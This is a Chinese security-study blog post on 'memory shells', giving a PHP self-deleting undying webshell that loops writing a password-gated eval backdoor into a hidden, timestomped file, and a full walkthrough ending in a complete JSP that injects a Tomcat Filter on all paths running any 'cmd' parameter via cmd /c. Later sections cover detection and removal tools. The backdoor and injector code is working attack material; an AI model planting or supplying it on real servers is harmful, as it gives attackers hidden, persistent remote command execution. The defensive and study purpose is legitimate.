<!-- build time:Thu Jan 18 2024 13:22:55 GMT+0800 (China Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="余星酒" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="余星酒" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="余星酒" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Java代码审计,Java安全基础篇"><link rel="canonical" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><title>Tomcat内存马 - Java安全基础 - 代码审计 | 余星酒 = 余星酒 = 痴看年少风雨疾，一转本生蹉跎游</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Tomcat内存马</h1><div class="meta"><span class="item" title="创建时间：2023-12-28 09:09:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-12-28T09:09:00+08:00">2023-12-28</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">余星酒</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeudstjqj20zk0m8k3r.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciusoyjnj219g0u0x56.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclxxcb6rj20zk0m8b29.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="item" rel="index" title="分类于 代码审计"><span itemprop="name">代码审计</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" itemprop="item" rel="index" title="分类于 Java安全基础"><span itemprop="name">Java安全基础</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="余星酒"><meta itemprop="description" content="痴看年少风雨疾，一转本生蹉跎游, 欢迎参观我的笔记空间 ~ 这里主要会记录一些安全相关的学习笔记 🌸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="余星酒"></span><div class="body md" itemprop="articleBody"><h1 id="php内存马"><a href="#php内存马" class="headerlink" title="php内存马"></a>php内存马</h1><p>php内存马的实现过程</p><pre><code class="php">&lt;?php
  ignore_user_abort(true); //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开,脚本将继续运行。
  set_time_limit(0); //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
  unlink(__FILE__); //删除自身
  $file = &#39;.config.php&#39;;
  $code = &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)
  &#123;@eval($_POST[a]);&#125; ?&gt;&#39;;
  while (1)&#123;
  file_put_contents($file,$code); //创建shell.php
  system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .config.php&#39;);
  usleep(50); //间隔时间
  &#125;
?&gt;
</code></pre><p>大致执行流程如下</p><ol><li>将携带循环生成木马的命令脚本上传到服务器</li><li>删除文件本身</li><li>让其以隐藏文件的方式，死循环创建文件，并向文件中写入木马<br>根据代码展示得出它的文件名<code>.config.php</code>普通的<code>ls</code>无法查看，必须通过<code>ls -lah</code>可以查看</li></ol><h2 id="查杀php内存马"><a href="#查杀php内存马" class="headerlink" title="查杀php内存马"></a>查杀php内存马</h2><ol><li>重启php服务器 <code>service apache2 restart</code></li><li>强行kill后台进程<code>ps aux | grep www-data | awk &#39;&#123;print $2&#125;&#39; | xargs kill -9</code></li><li>while循环脚本删除文件 <code>while :;do rm -rf .config.php; done</code></li><li>建立一个和不死马相同名字的文件或目录，不断竞争写入一个和不死马同名的文件</li></ol><pre><code class="php">&lt;?php
  while (1) &#123;
  $pid = 不死马的进程PID;
  @unlink(&quot;.ski12.php&quot;);
  exec(&quot;kill -9 $pid&quot;);
  usleep(20);
&#125;
?&gt;
</code></pre><p>根据php来类比一下java</p><ol><li>内存马无文件落地，用户无法浏览到</li><li>文件不死，能够循环执行</li></ol><h1 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h1><h2 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h2><ol><li>执行 <code>new XXX()</code> 时会触发JVM加载XXX.class文件</li><li>JVM从本地磁盘找到XXX.class文件并加载到JVM内存中</li><li>.class文件加载入内存后，JVM会自动创建一个class对象，一个类只会产生一个class对象</li><li>得到class对象后，反向获取XXX对象的各种信息</li></ol><h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228095413483.png"><p>但是Tomcat不是这种机制</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228095505861.png"><p>因此在分析某些类的时候，要按照对应Tomcat里面去分析</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228093815544.png"><blockquote><p>客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就能够达到内存马的效果<br>总结就是<code>对访问路径映射及相关处理代码的动态注册</code></p></blockquote><p>按照作用的位置分为</p><ol><li>listener内存马</li><li>filter内存马</li><li>servlet内存马<br>这三种统称为servlet-api型<br>在特定框架中，Spring&#x2F;Strust2等框架，按照位置分为</li><li>interceptor型</li><li>controller型<br>同时针对不同的中间件还可分为</li><li>Tomcat的Pipeline&amp;Valve</li><li>Grizzly的FilterChain&amp;Filter等等<br>最后一种是字节码增强型内存马</li></ol><ul><li>java agent内存马<br>最终分类</li></ul><ol><li>动态注册 servlet&#x2F;filter&#x2F;listener（使用servlet-api的具体实现）</li><li>动态注册 interceptor&#x2F;controller（使用框架如spring&#x2F;struct2）</li><li>动态注册使用职责链设计模式的中间件、框架的实现（Tomcat的Pipeline&amp;Valve、Grizzly的FilterChain&amp;Filter等）</li><li>使用Java Agent技术写入字节码</li></ol><h1 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h1><p>Filter也称为过滤器，过滤器实际上就是对web资源进行拦截，做一些过滤，权限鉴别等处理后再交给下一个过滤器或servlet处理，通常都是用来拦截request进行处理的，也可以对返回的response进行拦截处理</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228095812652.png"><p>当多个filter同时存在的时候，组成了filter链，web服务器根据filter在web.xml文件中的注册顺序，决定先调用哪个filter，第一个filter的<code>doFilter</code>方法被调用时，web服务器会创建一个代表Filter链的<code>FilterChain</code>对象传递给该方法，在doFilter方法中，开发人员如果调用了FilterChain对象的doFilter方法，则web服务器会检查FilterChain对象中是否还有filter，如果有，则调用第二个filter，如果没有，则调用目标资源</p><h2 id="Filter生命周期"><a href="#Filter生命周期" class="headerlink" title="Filter生命周期"></a>Filter生命周期</h2><pre><code class="java">public void init(FilterConfig filterConfig) throws ServletException   //初始化
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException;   //拦截请求
public void destroy();  //销毁
</code></pre><p>Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁，在web容器卸载Filter对象之前被调用，该方法在Filter的生命周期中仅执行一次，在这个方法中，可以释放过滤器使用的资源</p><h2 id="Filter类"><a href="#Filter类" class="headerlink" title="Filter类"></a>Filter类</h2><pre><code class="java">FilterDefs : 存放FilterDef的数组，FilterDef中存储这我们过滤器名，过滤器实例等基本信息
FilterConfigs : 存放FilterConfig的数组，在FilterConfig中主要存放FilterDef和Filter对象等信息
FilterMaps : 存放FilterMap的数组，在FilterMap中主要存放FilterName和对应的URLPattern
FilterChain : 过滤器链，该对象上的doFilter方法能依次调用链上的Filter
ApplicationFilterChain : 调用过滤器链
ApplicationFilterConfig : 获取过滤器
ApplicationFilterFactory : 组装过滤器链
WebXml : 存放web.xml中内容的类
ContextConfig : Web应用的上下文配置类
StandardContext : Context接口的标准实现类，一个COntext代表一个Web应用，其下可以包含多个Wrapper
StandardWrapperValve : 一个Wrapper的标准实现类，一个Wrapper代表一个Servlet
</code></pre><h3 id="wrapper和Context"><a href="#wrapper和Context" class="headerlink" title="wrapper和Context"></a>wrapper和Context</h3><p>Servlet是java最基本的应用，而Tomcat是一个大的Servlet容器，tomcat主要由connector连接器和容器组成，这些容器是父子关系，不是平行关系</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228153522249.png"><p>和Servlet的方式不同，Filter只能通过配置web.xml来实现效果，Tomcat时通过以下方法来实现</p><ol><li>根据请求的URL从<code>FilterMaps</code>中找出与之URL对应的<code>FIlter名称</code></li><li>根据Filter名称去<code>FilterConfigs</code>中查找对应名称的<code>FilterConfig</code></li><li>找到对应的<code>FIlterConfig</code>之后添加到<code>FIlterChain</code>中，并且返回<code>FilterChain</code></li><li><code>FilterChain</code>中调用<code>internalDoFilter</code>便利获取<code>chain</code>中的<code>FilterConfig</code>然后从<code>FilterConfig</code>中获取<code>Filter</code>，然后调用Filter的<code>doFilter</code>方法<br>但是在实际过程中，无法操控web.xml，需要使用反射去动态注册</li><li>创建一个恶意的<code>Filter</code></li><li>利用<code>FilterDef</code>对<code>Filter</code>进行一个封装</li><li>将<code>FilterDef</code>添加到<code>FilterDefs</code>和<code>FilterConfig</code>中</li><li>创建<code>FilterMap</code>将创建的FIlter和urlpattern相对应，存放到<code>FilterMaps</code>中(由于Filter生效会有一个先后顺序，所以一般都是放在最前面，让创建的恶意FIlter最先触发)<br>整个流程下来，可以发现程序在创建过滤器链的时候，context变量里面包含了三个和filter有关的成员变量<code>filterConfigs</code>、<code>filterDefs</code>、<code>filterMaps</code></li></ol><p>现在要解决的问题就是如何获取这个<code>context</code>对象以及如何<code>修改这三个变量</code>将<code>恶意类插入</code><br>Tomcat中对应的<code>ServletContext</code>实现是<code>ApplicationContext</code></p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228155508112.png"><p>在web应用中获取的ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandContext实例，以此来获取操作Tomcat容器内部的一些信息，如Servlet的注册等</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228161739913.png"><p>当我们能直接获取request的时候，可以直接将ServletContext转为StandardContext从而获取context</p><ol><li><code>ServeltContext =&gt; ApplicationContext</code></li></ol><pre><code class="java">ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
//上面几行的目的是为了获取(ApplicationContext)context
</code></pre><p>通过Java反射获取<code>servletContext</code>所属的类（ServletContext实际上是ApplicationContextFacade对象）使用<code>getDeclaredField</code>根据指定名称<code>context</code>获取类的属性（<code>private final org.apache.catalina.core.ApplicationContext</code>）因为是<code>private</code>类型，所以使用<code>setAccessible</code>取消对权限的检查，实现对私有的访问</p><p><code>appctx</code>的值</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228162612126.png"><ol start="2"><li><code>ApplicationContext =&gt; StandardContext</code> ApplicationContext实例中包含了StandardContext实例</li></ol><pre><code class="java">Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
//上面几行的目的是为了获取(StandradContext)context
</code></pre><p>通过Java反射获取applicationContext所属的类(org.apache.catalina.core.ApplicationCOntext)使用getDeclaredField根据指定名称context获取类的属性(private final org.apache.catelina.core.StandardContext)和上面一样，需要取消对权限的检查，实现对私有的访问</p><p><code>stdctx</code>的值</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228205107232.png"><p>这样就可以获取(StandardContext)context对象</p><pre><code class="java">ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
        appctx.setAccessible(true);
// ApplicationContext 为 ServletContext 的实现类
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
        stdctx.setAccessible(true);
// 这样我们就获取到了 context 
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
</code></pre><ol start="3"><li>如何修改对应的属性</li></ol><p><code>addFilterDef</code> : 添加一个filterDef到Context<br><code>addFilterMapBefore</code> :  添加<code>filterMap</code>到所有<code>filter最前面</code><br><code>ApplicationFilterConfig</code>:  为指定的过滤器<code>构造一个新的 ApplicationFilterConfig</code></p><p>先需要实例化一个<code>FilterDef对象</code>，并将恶意构造的<code>恶意类添加到filterDef</code>中</p><pre><code class="java">//定义一些基础属性、类名、filter名等
filterDemo filter = new filterDemo();
FilterDef filterDef = new FilterDef();
//name = filterDemo
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
filterDef.setFilter(filter);
//添加filterDef
standardContext.addFilterDef(filterDef);
</code></pre><p>之后实例化一个FilterMap对象，并将filterMap到所有filter最前面</p><pre><code class="java">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都        可触发可设置为/*
FilterMap filterMap = new FilterMap();
// filterMap.addURLPattern(&quot;/*&quot;);
filterMap.addURLPattern(&quot;/xyz&quot;);
//name = filterDemo
filterMap.setFilterName(name);
filterMap.setDispatcher(DispatcherType.REQUEST.name());
//添加我们的filterMap到所有filter最前面
standardContext.addFilterMapBefore(filterMap);
</code></pre><p>最后，FilterConfigs存放filterConfig的数组，在FilterConfig中主要存放FilterDef和Filter对象等信息</p><p>先获取当前filterConfigs信息</p><pre><code class="java">Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
</code></pre><p>通过Java反射来获得构造器（Constructor）对象并调用其newInstance()方法创建创建FilterConfig</p><pre><code class="java">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
</code></pre><p>然后将恶意的filter名和配置好的filterConfig传入</p><pre><code>//name = filterDemo
</code></pre><p>至此，我们的恶意filter已经全部装载完成</p><pre><code class="java">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.deploy.FilterDef&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.deploy.FilterMap&quot; %&gt;
&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
&lt;%
    final String name = &quot;FilterAgent&quot;;
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);
    if (filterConfigs.get(name) == null)&#123;
        Filter filter = new Filter() &#123;
            @Override
            public void init(FilterConfig filterConfig) throws ServletException &#123;
            &#125;
            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;
                HttpServletRequest req = (HttpServletRequest) servletRequest;

                if (req.getParameter(&quot;cmd&quot;) != null)&#123;
                    byte[] bytes = new byte[1024];
                    Process process = new ProcessBuilder(&quot;cmd&quot;,&quot;/c&quot;,req.getParameter(&quot;cmd&quot;)).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes,0,len));
                    process.destroy();
                    return;
                &#125;
                filterChain.doFilter(servletRequest,servletResponse);
            &#125;
            @Override
            public void destroy() &#123;
            &#125;
        &#125;;
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * 将filterDef添加到filterDefs中
         */
        standardContext.addFilterDef(filterDef);
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern(&quot;/*&quot;);
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
        filterConfigs.put(name,filterConfig);
        out.print(&quot;Inject Success !&quot;);
    &#125;
%&gt;
</code></pre><h1 id="Tomcat内存马的排除与查杀"><a href="#Tomcat内存马的排除与查杀" class="headerlink" title="Tomcat内存马的排除与查杀"></a>Tomcat内存马的排除与查杀</h1><p>利用Java Agent技术遍历所有已经加载到内存中的class，先判断是否是内存马，是则进入内存查杀</p><pre><code class="java">public class Transformer implements ClassFileTransformer &#123;
    public byte[] transform(ClassLoader classLoader, String s, Class&lt;?&gt; aClass, ProtectionDomain protectionDomain, byte[] bytes) throws IllegalClassFormatException &#123;
    // 识别内存马
    if(isMemshell(aClass,bytes))&#123;
        // 查杀内存马
        byte[] newClassByte = killMemshell(aClass,bytes);
        return newClassByte;
    &#125;else&#123;
        return bytes;
        &#125;
    &#125;
&#125;
</code></pre><ul><li>访问时抛出异常（或者跳过调用）中断此次调用</li><li>从系统中移除该对象</li></ul><h2 id="排除方法"><a href="#排除方法" class="headerlink" title="排除方法"></a>排除方法</h2><ol><li>如果是jsp注入，日志中排查可以jsp的访问请求</li><li>如果是代码执行漏洞，排除中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</li><li>根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞</li><li>如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志，根据url最早访问时间确定被注入时间</li><li>如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面不存在但返回200的</li></ol><h2 id="查杀方式"><a href="#查杀方式" class="headerlink" title="查杀方式"></a>查杀方式</h2><p>可以使用哥斯拉，冰蝎，或者上文提到的内存马进行一个生成，然后再进行查杀。</p><ol><li><p>VisualVM（远程调试）<br>VisualVM是一个集成多个JDK命令行工具的可视化工具。可以作为Java应用程序性能分析和运行监控的工具。开发人员可以利用它来监控、分析线程信息，浏览内存堆数据。系统管理员可以利用它来监测、控制Java应用程序横跨整个网络的情况。</p></li><li><p>arthas<br>arthas是Alibaba开源的Java诊断工具 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvYXJ0aGFz">https://github.com/alibaba/arthas</span> 是一个比较好用的java应用检测工具，了解文档可以从这里<span class="exturl" data-url="aHR0cHM6Ly9hcnRoYXMuYWxpeXVuLmNvbS96aC1jbi8=">https://arthas.aliyun.com/zh-cn/</span><br>mbean(查看 Mbean 的信息，查看异常Filter&#x2F;Servlet节点)</p></li><li><p>Copagent<br>这个项目是上面的改进版本，直接可以确定风险等级，并且将内存中的信息全部输出。<br>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L2NvcGFnZW50">https://github.com/LandGrey/copagent</span><br>试了一下，只有jdk1.8能够运行，之后会生成一个.copagent，里面有扫描结果。</p></li><li><p>java-memshell-scanner<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2MwbnkxL2phdmEtbWVtc2hlbGwtc2Nhbm5lcg==">https://github.com/c0ny1/java-memshell-scanner</span><br>通过jsp脚本扫描并查杀各类中间件内存马，比Java agent要温和一些。</p></li></ol><div class="tags"><a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="ic i-tag"></i> Java代码审计</a> <a href="/tags/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="tag"><i class="ic i-tag"></i> Java安全基础篇</a></div></div><footer><div class="meta"></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="余星酒 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="余星酒 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="余星酒 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>余星酒 <i class="ic i-at"><em>@</em></i>余星酒</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马">http://example.com/APT/代码审计/Java代码审计/审计基础/Tomcat内存马/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/fastjson/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipesng5oej20zk0m87d4.jpg" title="fastjson"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Java漏洞审计</span><h3>fastjson</h3></a></div><div class="item right"><a href="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexoj0moj20zk0m8kgu.jpg" title="shellcode"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 免杀学习</span><h3>shellcode</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">php内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">查杀php内存马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">java内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B"><span class="toc-number">2.1.</span> <span 